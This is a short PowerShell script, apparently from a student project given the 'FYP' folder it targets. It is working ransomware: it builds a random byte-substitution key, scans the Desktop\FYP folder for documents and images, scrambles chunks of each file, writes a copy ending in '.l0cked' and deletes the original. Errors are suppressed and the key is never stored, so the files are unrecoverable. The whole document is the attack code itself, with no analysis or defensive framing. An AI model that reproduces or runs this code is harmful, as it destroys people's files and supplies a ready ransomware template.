$ErrorActionPreference= 'silentlycontinue'
#Functions
Function genKey()
{
    $keyNums = 0..255
    $keyNums = $keyNums | Sort-Object {Get-Random} #shuffle
    $keyNums #return key array
}

Function encrypt($keyNums, $fileList)
{
 
    for($i = 0; $i -lt $fileList.Length; $i++)
    {
        
        [byte[]]$fileBytes = Get-Content $fileList[$i] -Encoding Byte
        $eachWrite = [Math]::Floor($fileBytes.Length/10)#increase point to write bytes
        $startPoint = 0

        try
        {
            for($j = 0; $j -lt 10; $j++) #max 100000*10 loops
            {
                for($k = $startPoint; $k -lt $startPoint + 100000; $k++)
                {
                    $fileBytes[$k] = $keyNums[$fileBytes[$k]]#shift bytes
                }
                $startPoint += $eachWrite
            }
        }
        catch{}

        $newName = $fileList[$i] + ".l0cked"
        set-content $newName -value $fileBytes -Encoding Byte
        del $fileList[$i]
    }

}

Function fileList()
{
    $files = cmd /c where /r "$env:USERPROFILE\Desktop\FYP" *.txt *.docx *.doc *.ppt *.pptx *.png *.jpg *.jpeg 
    $List = $files -split '\r'
    $List #return file list
}

#Main Program
$keyNums = @(genKey)
$fileList = @(fileList)
encrypt $keyNums $fileList
#Main Program


